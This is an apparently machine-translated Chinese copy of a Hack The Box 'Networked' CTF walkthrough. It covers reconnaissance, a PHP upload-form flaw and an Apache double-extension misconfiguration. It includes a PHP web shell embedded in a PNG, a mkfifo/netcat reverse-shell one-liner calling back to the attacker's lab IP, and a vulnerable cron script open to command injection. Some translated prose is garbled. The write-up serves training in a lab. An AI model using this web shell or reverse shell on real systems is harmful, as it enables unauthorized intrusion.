# 高温隧道：联网

[0xdf.gitlab.io](https://0xdf.gitlab.io/2019/11/16/htb-networked.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fnetworked-cover.png) 

网络涉及滥用Apache错误配置，该错误配置允许我上传包含具有双重扩展名的网络外壳的图像。有了这个，我得到了一个外壳作为w数据，然后做了两个特权。第一个滥用的命令注入到正在运行以清理上载目录的脚本中。然后，我使用对 ifcfg 脚本的访问来获取以 root 用户身份执行命令。在“超越根”中，我将更详细地介绍一下 Apache 配置。

## 箱子信息

名字

[网络](https://www.hackthebox.eu/home/machines/profile/203) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-networked.png) 

发行日期

[24 8月 2019](https://twitter.com/hackthebox_eu/status/1164472267797127168)

停用日期

16 11月 2019

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

简易 \[20\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fnetworked-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fnetworked-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

00天 00小时 38分36秒[![选择1kz](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F58052)](https://www.hackthebox.eu/home/users/profile/58052)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

00天 01小时 15分钟 30秒[![火卫二](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F31242)](https://www.hackthebox.eu/home/users/profile/31242)

造物主

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F8292)](https://www.hackthebox.eu/home/users/profile/8292)-

## 侦察

### n地图

`nmap`显示打开的 ssh （tcp 22） 和 http （tcp 80）：

    root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.146
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-24 15:00 EDT
    Nmap scan report for 10.10.10.146
    Host is up (0.59s latency).
    Not shown: 65532 filtered ports
    PORT    STATE  SERVICE
    22/tcp  open   ssh
    80/tcp  open   http
    443/tcp closed https
    
    Nmap done: 1 IP address (1 host up) scanned in 15.36 seconds
    root@kali# nmap -p 80,22,443 -sV -sC -oA scans/nmap-tcpscripts 10.10.10.146
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-24 15:01 EDT
    Nmap scan report for 10.10.10.146
    Host is up (0.022s latency).
    
    PORT    STATE  SERVICE VERSION
    22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
    | ssh-hostkey:
    |   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
    |   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
    |_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
    80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
    |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
    |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
    443/tcp closed https
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 8.28 seconds
    

443也发生了一些事情，因为它正在报告关闭。

根据[阿帕奇版本](https://access.redhat.com/solutions/445713)，网络可能是Centos 7或红帽7。

### 网站 - TCP 80

#### 网站

主站点返回一些粗略的文本：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1566683597684.png) 

页面源代码揭示了上载和库路径的存在：

    <html>
    <body>
    Hello mate, we're building the new FaceMash!</br>
    Help by funding us and be the new Tyler&Cameron!</br>
    Join us at the pool party this Sat to get a glimpse
    <!-- upload and gallery not yet linked -->
    </body>
    </html>
    

#### Web 目录暴力破解

`dirsearch`显示了几件事，但最有趣的是， ：`/backup/`

    root@kali# dirsearch.py -u http://10.10.10.146                                                                                                                                                                  [29/29]
    
     _|. _ _  _  _  _ _|_    v0.3.8
    (_||| _) (/_(_|| (_| )
    
    Extensions:  | Threads: 10 | Wordlist size: 5686
    
    Error Log: /opt/dirsearch/logs/errors-19-08-24_15-03-21.log
    
    Target: http://10.10.10.146
    
    [15:03:21] Starting: 
    [15:03:23] 403 -  213B  - /.ht_wsr.txt
    [15:03:23] 403 -  215B  - /.htaccess-dev
    [15:03:23] 403 -  206B  - /.hta
    [15:03:23] 403 -  217B  - /.htaccess-marco
    [15:03:23] 403 -  217B  - /.htaccess-local
    [15:03:23] 403 -  215B  - /.htaccess.BAK
    [15:03:23] 403 -  216B  - /.htaccess.bak1
    [15:03:23] 403 -  215B  - /.htaccess.old
    [15:03:23] 403 -  216B  - /.htaccess.save
    [15:03:23] 403 -  215B  - /.htaccess.txt
    [15:03:23] 403 -  216B  - /.htaccess.orig
    [15:03:23] 403 -  217B  - /.htaccess_extra
    [15:03:23] 403 -  214B  - /.htaccessBAK
    [15:03:23] 403 -  214B  - /.htaccess_sc
    [15:03:23] 403 -  218B  - /.htaccess.sample
    [15:03:23] 403 -  214B  - /.htaccessOLD
    [15:03:23] 403 -  212B  - /.htaccess~
    [15:03:23] 403 -  215B  - /.htaccessOLD2
    [15:03:23] 403 -  216B  - /.htaccess_orig
    [15:03:23] 403 -  210B  - /.htgroup
    [15:03:23] 403 -  215B  - /.htpasswd-old
    [15:03:23] 403 -  212B  - /.htpasswds
    [15:03:23] 403 -  216B  - /.htpasswd_test
    [15:03:23] 403 -  210B  - /.htusers
    [15:03:29] 301 -  235B  - /backup  ->  http://10.10.10.146/backup/
    [15:03:29] 200 -  885B  - /backup/
    [15:03:31] 403 -  210B  - /cgi-bin/
    [15:03:46] 200 -  229B  - /index.php
    [15:03:46] 200 -  229B  - /index.php/login/
    [15:04:00] 200 -  169B  - /upload.php
    [15:04:00] 301 -  236B  - /uploads  ->  http://10.10.10.146/uploads/
    [15:04:00] 200 -    2B  - /uploads/
    
    Task Completed
    

#### /备份

此路径包含单个文件：`backup.tar`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1566683774080.png) 

我将下载它，并使用以下内容打开它：`tar xvf backup.tar`

    root@kali# tar xvf backup.tar
    index.php
    lib.php
    photos.php
    upload.php
    

它是该网站的源代码。

### 源代码分析

该网站有四个php文件，其中三个是网页，并包含在其他文件中。`lib.php`

`index.php`是我上面看到的静态页面。

#### 上传.php

`upload.php`是一系列检查，如果全部通过，则保存上传的文件：

      1 <?php
      2 require '/var/www/html/lib.php';
      3 
      4 define("UPLOAD_DIR", "/var/www/html/uploads/");
      5 
      6 if( isset($_POST['submit']) ) {
      7   if (!empty($_FILES["myFile"])) {
      8     $myFile = $_FILES["myFile"];
      9 
     10     if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
     11       echo '<pre>Invalid image file.</pre>';
     12       displayform();
     13     }
     14 
     15     if ($myFile["error"] !== UPLOAD_ERR_OK) {
     16         echo "<p>An error occurred.</p>";
     17         displayform();
     18         exit;
     19     }
     20 
     21     //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
     22     list ($foo,$ext) = getnameUpload($myFile["name"]);
     23     $validext = array('.jpg', '.png', '.gif', '.jpeg');
     24     $valid = false;
     25     foreach ($validext as $vext) {
     26       if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
     27         $valid = true;
     28       }
     29     }
     30 
     31     if (!($valid)) {
     32       echo "<p>Invalid image file</p>";
     33       displayform();
     34       exit;
     35     }
     36     $name = str_replace('.','_',$_SERVER['REMOTE_ADDR']).'.'.$ext;
     37 
     38     $success = move_uploaded_file($myFile["tmp_name"], UPLOAD_DIR . $name);
     39     if (!$success) {
     40         echo "<p>Unable to save file.</p>";
     41         exit;
     42     }
     43     echo "<p>file uploaded, refresh gallery</p>";
     44 
     45     // set proper permissions on the new file
     46     chmod(UPLOAD_DIR . $name, 0644);
     47   }
     48 } else {
     49   displayform();
     50 }
     51 ?>
    

要成功上传文件，我需要为 true，并且大小小于 60000（第 10 行）。接下来，在第 22-29 行中有一个分机检查。 返回文件名和扩展名，然后根据四个常见的图像扩展名检查扩展名。`check_file_type($_FILES["myFile"])``getnameUpload`

一旦这些检查通过，就是通过将上传者中的IP地址替换为并添加和扩展来创建的。`$name``.``_``.`

#### 库.php

值得一看的是获取名称和扩展名的函数。它位于：`getnameUpload``lib.php`

     12 function getnameUpload($filename) {
     13   $pieces = explode('.',$filename);
     14   $name= array_shift($pieces);
     15   $name = str_replace('_','.',$name);
     16   $ext = implode('.',$pieces);
     17   return array($name,$ext);
     18 }
    

我可以通过运行来显示shell中发生了什么（这通常是我对这种事情进行故障排除的方式）。如果我从 的文件名开始，然后从网络运行相同的代码，并带有一些额外的打印语句：`php``php -a``image.png`

    php > $filename="image.png";
    php > $pieces = explode('.',$filename); print_r($pieces);
    Array
    (
        [0] => image
        [1] => png
    )
    php > $name= array_shift($pieces); echo $name;
    image
    php > $name = str_replace('_','.',$name); echo $name;
    image
    php > $ext = implode('.',$pieces); echo $ext;
    png
    

这就是我所期望的。值得注意的是，当我开始时会发生什么：`image.php.png`

    php > $filename="image.php.png";
    php > $pieces = explode('.',$filename); print_r($pieces);
    Array
    (
        [0] => image
        [1] => php
        [2] => png
    )
    php > $name= array_shift($pieces); echo $name;
    image
    php > $name = str_replace('_','.',$name); echo $name;
    image
    php > $ext = implode('.',$pieces); echo $ext;
    php.png
    

该扩展获取第一个之后的所有内容。这将派上用场。`.`

要注意的另一件事是函数：`lib.php``check_file_type`

     57 function check_file_type($file) {
     58   $mime_type = file_mime_type($file);
     59   if (strpos($mime_type, 'image/') === 0) {
     60       return true;
     61   } else {
     62       return false;
     63   }
     64 }
    

MIME 类型通常来自检查 MIME 数据库中的文件签名。所以以窗口可执行文件（或 dll）开头的东西。Linux 可执行文件以 开头。维基百科有一[个很棒的页面](https://en.wikipedia.org/wiki/List_of_file_signatures)。因此，只要我发送一个看起来像图像的小文件开始，它就会被保存为，其中是原始文件名中第一个之后的任何内容。`MZ``\x7fELF``10_10_14_7.$ext``$ext``.`

### 预期功能

我按照原意看了一下这个网站。在 上，有一个简单的表单：`/upload.php`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1566725658313.png) 

我创建了一个非常快速的png，并上传它。页面返回：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1566725684851.png) 

我将跳转到我从源代码获得的另一个页面：`photos.php`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1566725726691.png) 

我看到了我的图像，如果我右键单击并选择“查看图像”，则会转到并返回图像。`/uploads/10_10_14_5.png`

## 壳牌 饰 阿帕奇

### 创建网络外壳

我已经从源代码知道如何将文件上传到网络。我将从前面打开我的png，然后向下几行，并添加一些php：`vim`

    <89>PNG
    ^Z
    ^@^@^@^MIHDR^@^@^A<A5>^@^@^@<D2>^H^F^@^@^@<EA><82><DF>c^@^@^@   pHYs^@^@^N<C4>^@^@^N<C4>^A<95>+^NESC^@^@^Z:IDATx<9C><ED><DD>]כ(^T<86><E1>g<83>o<FF><FF><FF><AD><C0>^\<80><DF>Ɛ<A4>v<A0><B9><AF><B5><E6><A0>S^M<A0><94><8D><80>bf<96>^D^@@^C<DC><FF><9D>^A^@^@&^D%^@@J^@<80>f^P
    <94>^@^@<CD> (^A^@<9A>AP^B^@4<83><A0>^D^@h^FA     ^@<D0>^L<82>^R^@<A0>^Y^D%^@@J^@<80>f^P<94>^@^@<CD> (^A^@<9A>AP^B^@4<83><A0>^D^@h^FA     ^@<D0>^L<82>^R^@<A0>^Y^D%^@@J^@<80>f^P<94>^@^@<CD> (^A^@<9A>AP^B^@4<83><A0>^D^@h^FA     ^@<D0>^L<82>^R^@<A0>^Y^D%^@@J^@<80>f^P<94>^@^@<CD> (^A^@<9A>AP^B^@4<83><A0>^D^@h^FA     ^@<D0>^L<82>^R^@<A0>^Y^D%^@@J^@<80>f^P<94>^@^@<CD> (^A^@<9A>AP^B^@4<83><A0>^D^@h^FA     ^@<D0>^L<82>^R^@<A0>^Y^D%^@@J^@<80>f^P<94>^@^@<CD> (^A^@<9A>AP^B^@4<83><A0>^D^@h^FA     ^@<D0>^L<82>^R^@<A0>^Y^D%^@@J^@<80>f^P<94>^@^@<CD>^X~~~<FE><EF><^@^@ <89>'%^@@J^@<80>f^P<94>^@^@<CD> (^A^@<9A>AP^B^@4<83><A0>^D^@h^FA   ^@<D0>^L<82>^R^@<A0>^Y^D%^@@J^@<80>f^P<94>^@^@<CD> (^A^@<9A>AP^B^@4<83><A0>^D^@h^FA     ^@<D0>^L<82>^R^@<A0>^Y^D%^@@J^@<80>f^P<94>^@^@<CD> (^A^@<9A>AP^B^@4<83><A0>^D^@h^FA     ^@<D0>^L<82>^R^@<A0>^Y^D%^@@J^@<80>f^P<94>^@^@<CD> (^A^@<9A>AP^B^@4<83><A0>^D^@h^FA     ^@<D0>^L<82>^R^@<A0>^Y^D%^@@J^@<80>f^P<94>^@^@<CD> (^A^@<9A>AP^B^@4<83><A0>^D^@h^FA     ^@<D0>^L<82>^R^@<A0>^Y^D%^@@J^@<80>f^P<94>^@^@<CD> (^A^@<9A>AP^B^@4cH)<FD><DF>y^@^@@^ROJo#<98><E3>^N<D4>+ܡ<A7>zEP^B^@4<83><A0>^D^@h^FA  ^@<D0>^L<82>^R^@<A0>^Y<C3><FF><9D><81>^?M<8A>AQN<DE><D9><FF><9D><95><8D><BB><F3><D5>j<B9><FF>^U)^FŇs<D5>&3<93>{<F3>ڿ}<EF>RT<88>I漦S^_<E6><D3>J^^<8D><FA>ђ;<EB>J=IQ!J<CE>;5<F7>O<DB>L<D6>^<AE><FE>9<E6><8E><F7>><A5><A8><94><92>Bl<A7>S<B0><CD>gRJI)&^EY<9B><F5><F7>˵T<AF>^HJ<F8>#<CC>hh<EE><97>{<AE><FB><EB>l<E6>K<8F>7*<A6><E5><A9><E5><FF><B3>ϧ<C9>LR<8A><8A>1)<C6>(<EF><98>9hG[<F5><8A><A0><F4>^W<A4>^T<95>b<D2><FC><94>l&w<E8><99>$Ř6<EF>^S<98><B9><F9><D1>y<FD><98>^]C<90><EC>^O<F4>^RTLIs<92>fr<E6><B4>^_aI1^_<B7><E4>ݔBTZ<E5>a?^D4<FF>٤<98><A2><96><D3><DD>_^_^N<F8>^Ff&<9D><BD><8B>Ry<8F><AB><CE>;<E9>M<BF><96>I'<E7><F2><90>_Lj x♗<EA>ծ~,m@i<DB><F2><81><F9>8˝<93><B9>]pn^^ڥ<BB>r<B7><D2>;<CC><FF> <F3>^?<96><92>b<88>Z<DF><EA>^X<F2>^M<9A><8E>q<CE><E6>1{I<AB>q{<93><F3><FE><8F>^D<A4>^P<93><92>V<F9>RR
    <U+070F>1Ǡ<98>R        &NΤ^X*_<C4>+^Uל<97><F7>^<CE>L)ŋ1l<FC>Q<B5><F7><B8><F6><BC>]<9D>}K<E9><91><F7><F4>2'v^<A9>^_)*&<93>y/<EF><A7><FA><97><DB>D<B3>U<BB>^P<A3>b9<85><A0>t<B3><94><96><A7>^C<B3><F5><C4>᪗1<F5>!<9C><9B><8F>Y^G<81>ESCr5^GJ<BF>ɗ<DB>5^X<B9>G<AB>M<FE><9D><BC>Se
    <E3>d<9B><B1>js4HwHS<C7>g^Z&<CB><FF><B7><F2>^^^_=><AF><FC><E6>G<98>y<EC><C5>y<BD>z<B5>~<D8><FC><EF>>?%<E5><B6>O<AB><A7><F5><F9><EF>˩^L<DF><DD><EC>l^B1<F7>^V<8F><FF><B8>S<CA>Cb<B6>9<EE>Ƽ^]<C6>pr<E5>K))<AD>^Z<8F><C3>q%<FF>O<9B><A7><9B><F3><FF>}R^^<BA>=<F3>`x<AD><F6>^^<AF>
    <D3>xv<9E>><BD><AB>9*~<FE>;<F8>C^<A9>W/֏Gm<C0>ŭ'(<DD>.<AF>:ʍ<C0><D6>z"<D8>9˓<C0>!h<9E>x<B4>m^O<E5><CF>e)<E7><E5><E9>O<D7>^^<87><BF>d<DD><EB><CC>R<DC><CE><ED>-^?<F1>潛<EA>i^Lz<D0>L}X'<CA>^H^AK<C3>ESC<F2>z<BD><FA><AC>~<9C>^G<AA><A9>}$(<DD>,/^R<C8><C3>Xn<B5>
    
    <?php echo "START<br/><br/>\n\n\n"; system($_GET["cmd"]); echo "\n\n\n<br/><br/>END"; ?>
    
    ^P<DB>zU^?<AD><CC>9<B9>^X^T<C6>Q<C9>畀S9<DC><C9><D2>s|<97>^^B<92>DPzۡ<E7>aN~P<FE><F6>]^Y<CE>1<9B>ު_^]<E6><BD>^F<8B>
    !hYI<BD>^^<9A>)O4<FB><86>}z<CF>H<B9>7~<E4>48<AF>iY<B6>,<96><CF>Ѽ<90><86><96><B9><92>u<C2>q<FE>^Q'_&̟<97><E3><81><EA>r<D4><E7>e<F3>ë^@Ys<EE>'i<BC>*<95><A1><DC>+<9B>z<F5>µ<9A><EA><9F>B\<F2>o&<EF><BD>:j<8F>p<93><9E><9E><94><EC>ׯ_́^B^@<9A><D0>G<E8>lPO<AB>Y<D0>^O<EA>^U<EE><D0>S
    <BD>"(<BD><A9><97>Ga<F4><85>z<85>;<F4>T<AF><FA><C9>icz<EA>y<A0>^_<D4>+ܡ<A7>zEPzSO=^O<F4><83>z<85>;<F4>T<AF><FA><C9>icz<EA>y<A0>^_<D4>+ܡ<A7>ze<C3>0<B0><FA>^N^@Є<A1><A7><C7>:^@<C0><BF><8D><88><F4><A6><9E>^^<87><D1>^O<EA>^U<EE><D0>S<BD>"(<BD><89>'L܁z<85>;<F4>T<AF><FA><C9>icz<EA>y<A0>^_<D4>+ܡ<A7>zEPzSO=^O<F4><83>z<85>;<F4>T<AF><F8> <EB><9B><CE>>p<98>R<FE>^X<E6><F4>1g3'wض:^?<BD>9<84><D5>Fxfr<EE><FC>C<A6>1<FC>VH^ü#mP<88>qٻɜ<BC>sr<BB>sO<8F><F3><EE>t/<9F>}^Z<B9>,Aa,<DB>[<FC>^L'<BD><97><D7><CA>q8<BB><B2>^\uy<B9>H<E7><C5>s<F3><D7><C0><93><E4>^F<FD>T<EC><EB>Qw<CF><EB><CB>{Z<AF><AA><AF>U<FE><98>lX2S}?<F0>o<EB>郬^D<A5>7^]n<F0><D4><F8><99><93><F7><F9>K<DC>1D<85>QҰ4R)^D<8D>1<C9>Jca))Ơ<98>^O<DC>5 <F9>k<DE><DB><ED>^S<CA>^F~~<D9>^^#<84><A4>d<EB>mESC<96><E3><B6>yI<D2>0<9C>^D<C9><F5>n<A8><BB><86><ED><81><D7>ʱ;<B7><B2>^\<B5>yy<90><CA><EB>禜<87><FA><E3>+<EF>yuy<8F><F5><EA><A5>k5<E6><CD>^@<AD><EC><E9><95>b<C8>_^Lߥ<81><EF><D3>K@<92>^X<BE>{<DB>v<8C>v<DA>f<DC><C9>^O~<B5>^E<B9><93>)<AE><F6><C1>){☟<9F>Z<CC><E5>sL:<EE><97>S<B6>^U775xy<93><B8>a<F0><A5><A7><EC>5^L<BE><EC><B5>3<E5><A7><EC><C1>c<F9><EF>
    <B6>yI<C7>Fz<93><86><A4>yS<B9>a<B3>k<EA><EE><A4><D7>ʱ?<B7><AA>^\<B5>yy<E0><E5>ssPM<BA><DA>^Kj_<8E><CA>{^[^<9D>ի<BA>s<E7><ED>ٽ<D7><E0><9D><9C><9B><B6>MI<F3>.<B9><F8>^<CC>)}<81>m<CF>#o-.<E7><B6>^W<B4>lI<9E><CA>^V䛿z<F2>gi:o<D9>I<D4>|^N^B<DB>]Χ<9D>d<97>_<CA><C7>ك<E3><B6>9٧
    <91><F7><E5><B9>~<D2>y<B5>^\<87>s<AA><CA>Q<9F><97>^TG<FD><FE><FD>[a<FD><EF><EE><C5>r(<C5>^R<C4><CE>7<C4>;<A6>Q^?ϫ˫c<8F><B6><EE>ܤ<94>3<B3>^]<D2>3<A7><E1><E7>G^C<C3>w_<8F>'<A5>/<B0><E9>y<94>^F<C8>^N<F3>5e<9B><D1>4ͻ<98><9C><B7><<EC>^SK<A3><95>r<8F>{<DA>!t<99>w8<B5><D2>ESC
    <DF>OV<94><DF>Y<A2>J><AC>vǝ<A5><A1><B9>Q<BD><F6>J9Nέ*Gm^<96><DF><DD><EE><A6><F8>ʹI!D<C9><FC><E9><9C><D6>i^Z<AF><DC><F3><DA><F2>jߣ<AD>=<B7>lC^?<B9><E3>/<BE>YOOJ<CC>)<BD>i<D3><F0>N<F3><CA>'<C7><D9><FA>^X<93><CC>y
    ^Z<C3>8<EF>P;<ED>^V<BB>^]f<CA>=q<DB>?<F1>hwL^Yr:^?"(<8D>Uzt\M^Z<E7><EA><CB>Q<E3>Y9<9E><E5>e<D0><CF>^Gݫ^T<83>b2<F9>2<C4>Y<95><C6>^K<F7><FC>$Ň<E5>}ޣ=9w<B5>!n^L<A3><E2><D4>QP<C5>N<C0><F8>
    ==)^Q<94>޴]<CD>r5f<BF>_^U^W5<86><BC>@<C0>m^V^H<EC>&<A4>SR<92><9D><AE><96><9B><D2>L!ϛ<D8><C9>j<AF><9C>Vȓ<E4>R^Y<CE><DA>^]<F7>4<8D>Ǫ<CB><F1><FC><97><9E><96><E3>Veq<83><F9><FD>^B<90><A7>'^<FC><DD><D5>^O]<97><F7>z<95><D4><F5><B9>)^F<85><B2><CA>r<FA>s^L<A3><92>^F<86><F0><BE>^\<AB><EF><BE><C0><F6>^F<E7><85>^H<E7><D6><DD><E5><A8>X<86><89><E6>y^B+=<DE>ߣb<88>r<F3><D2><EF>(<E9><D1>^PTR^Lci<9C>^^78f^ާ||̫<EF>Ҫ<E7>|<9D>ƕ<FA>r\<AB>+<C7>}<F2>
    <BD>dk<EF><F9>><BD><EB><F2>^^E<A4><A7><D7><CA>\Y^D1<FD>X<B9>^_1*9<CF><D0><DE>^W<EB>% I<CC>)<BD>m3F;<8F><A2>^\ESC<A9>i^X%<B7>aIQ<EB><E5><D7><CB>^O<98><D3>j^^<E2>j<8E><A0>,<FD>-+<CB>.ESCS<9B><E6>$<BC><86>a<90><B3>i<C5>س4<9E><A8>.<C7><E5><8F>ԗ<E3>&<F3><8A>5<B7>
    <A0><F3>B<90><B3><BB><B9>R{<CF>W<FF><B7><A6><BC><E7>c<FF>OΝ<A7>^S^_ݏ'e<C1>?<8F>9<A5>/<B0><E9>y<94><C6><E0><B8><F2>v^Z<EC><AF>h<F8><D7><E7><A6>2<D7>s<E8>ݔ<DE>r<BA><98>+HI1<A5><93><89>~<CB><F3><E2><D3>^D<FD><C3>4>T<D5><FA>U<94><E3>/<98><96>J<C7>ͼX^Q<83><C6>^X<E4><FC><CF>
    <F9>^\<D9>K<C7>^^m͹<F9>ަ<D5><DC>^R<B0>Ɠ<D2>^W8<AC><92>2I1j<F3><8A>N<8A><CA><EF>=.+<E8><F2><D0>ܾ<E7>Z<9E>Z<AC><F4><D8>S,s=<DB>4<D3><FC><EE><CD>U<C3>6<BD>4<BA>^?Z<C9>/<C9>Nyx<94>F<9D><CA>r<<CA>aU9<EE><E7>ܠa<D8><FD><E7><CB>0<97>y<F9>Ë<C6>k<B5><F7><FC><B5><F2><EE>{<B4>u<E7>
    <96>y<C1>^TwA2<E6>{<FE><E4>~<E0><DF>Ǔ<D2>^W<D8><CF>)9<EF>^UǠ^P<A4><E4><96>7<EF>%<B7>4&<E6><E4>]<D4>^X<F3>q<CB>ESC<FF><A1>,<A5><CE>^MY~<D2><F1><BB><D5><C2><E5><A5>X<95><DF>><BC><A0>j<B9>!4<93>sR<88>AcJ%<ED><FC>I<A0>(<C9><CA>^\<D0>y^Zy<9E>i^^<C0>J<CB><FF><8B><9B>4<EA><CA>q
    <AE><B2>^\<B5>y<91><CA>W^O$7<AC><BF>jQS<8E><93>|<9A>dAJ<B6>]^@rL<A3><F2><9E><BF>P^i_<AF><EA><CF>5<E7><E4>bP^XG%<9F>W^QN<E5><DD>^LO<E2>+<F5><F4><A4>DPz<D3>a5<8B>9<F9>A<F9>;he(<C8>lz<AB>~u<98><F7>^Z,*<84><A0>e%<F5>zh<A6><<D1><EC>ESC<F6><E9>=#%<85><B0>^_k<92>$<A7><C1>yM˲e
    <B1>|<8E><E6><85>4<B4>̳<AC>^S<8E><F3><8F>8<F9>2a<FE><BC>^\^OT<97><A3>>/<9B>^_^^E<C8><FA>sk<ED><C6><C7>j<EE><F9>^K<E5><95>v<F5><EA><95>sK^^T<E2>RN3y<EF><D5>Q{<84><9B><F4><B4><FA><CE>~<FD><FA><C5>^\(^@<A0>        }<84><CE>^F<F5>4F<8B>~P<AF>p<87><9E><EA>^UA<E9>M<BD><
    <A3>/<D4>+ܡ<A7>z<D5>ONESC<D3>S<CF>^C<FD><A0>^<E1>^N=<D5>+<82>қz<EA>y<A0>^_<D4>+ܡ<A7>z<D5>ONESC<D3>S<CF>^C<FD><A0>^<E1>^N=<D5>+ESC<86><81><D5>w^@<80>&^L==<D6>^A^@<FE>mD$^@@J^@<80>f^P<94>^@^@<CD> (^A^@<9A>AP^B^@4<83><A0>^D^@h^FA      ^@<D0>^L<82>^R^@<A0>^Y^D%^@@3<FE>^C^Yb^Pi쏒<BB>^@^@^@^@IEND<AE>B`<82>
    

我可以在它上运行，以确保它仍然与PNG的哑剧类型匹配：`file`

    root@kali# file shell.png 
    shell.php.png: PNG image data, 421 x 210, 8-bit/color RGBA, non-interlaced
    

### 上传网页外壳

我可以将我的文件上传为 .但是在访问它时，我只是得到了一个破碎的图像：`shell.png`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1566725870104.png) 

这是因为服务器未配置为使用php解释器处理文件。我花了很长时间在上传php源代码中寻找逻辑错误，这些错误可以让我在网络上获得一些命名的东西。然后我尝试了一些我知道不起作用的东西，它做到了：上传为.当我这样做时，它在图库中显示为已损坏：`.png``shell.php``shell.php.png`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1566725986450.png) 

当我查看时，我看到图像的字符串和php在中间执行：`/uploads/10_10_14_5.php.png`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1566726099763.png) 

我最后补充一点：`?cmd=id`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1566726130362.png) 

### 什么？为什么？

在这一点上，我非常困惑。事实证明，这是Web服务器如何决定以代码形式执行的内容而不是返回静态文件或图像的配置错误。详情[请见此处](https://blog.remirepo.net/post/2013/01/13/PHP-and-Apache-SetHandler-vs-AddHandler)。标准情况是 php 将只处理以 结尾的文件。这里的配置错误意味着，只要在名称中的某个地方，它就会作为php进行处理。我将在“超越根”中进一步研究配置。`.php``.php`

### 壳

为了获得真正的贝壳，我刚刚访问了：`/uploads/10_10_14_5.php.png?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E&1|nc%2010.10.14.7%20443%20%3E/tmp/f`

    root@kali# nc -lnvp 443
    Ncat: Version 7.70 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.146.
    Ncat: Connection from 10.10.10.146:53204.
    sh: no job control in this shell
    sh-4.2$ id
    uid=48(apache) gid=48(apache) groups=48(apache)
    

## 对古利的隐秘

### 列举

作为apache，我可以访问主机上唯一的主目录。有三个文件：

    bash-4.2$ ls -l
    total 12
    -r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
    -rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly
    -r--------. 1 guly guly  33 Oct 30  2018 user.txt
    

我无法访问，但其他两个很有趣。 显示了每 3 分钟运行一次的配置：`user.txt``crontab.guly``php /home/guly/check_attack.php`

    bash-4.2$ cat crontab.guly 
    */3 * * * * php /home/guly/check_attack.php
    

`check_attack.php`是处理目录中的文件的 php 脚本：`uploads`

    <?php
    require '/var/www/html/lib.php';
    $path = '/var/www/html/uploads/';
    $logpath = '/tmp/attack.log';
    $to = 'guly';
    $msg= '';
    $headers = "X-Mailer: check_attack.php\r\n";
    
    $files = array();
    $files = preg_grep('/^([^.])/', scandir($path));
    
    foreach ($files as $key => $value) {
            $msg='';
      if ($value == 'index.html') {
            continue;
      }
      #echo "-------------\n";
    
      #print "check: $value\n";
      list ($name,$ext) = getnameCheck($value);
      $check = check_ip($name,$value);
    
      if (!($check[0])) {
        echo "attack!\n";
        # todo: attach file
        file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);
    
        exec("rm -f $logpath");
        exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
        echo "rm -f $path$value\n";
        mail($to, $msg, $msg, $headers, "-F$value");
      }
    }
    
    ?>
    

我立即被一条线所吸引：

    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    

如果我能控制 或 ，则有明显的代码注入。`$path``$value`

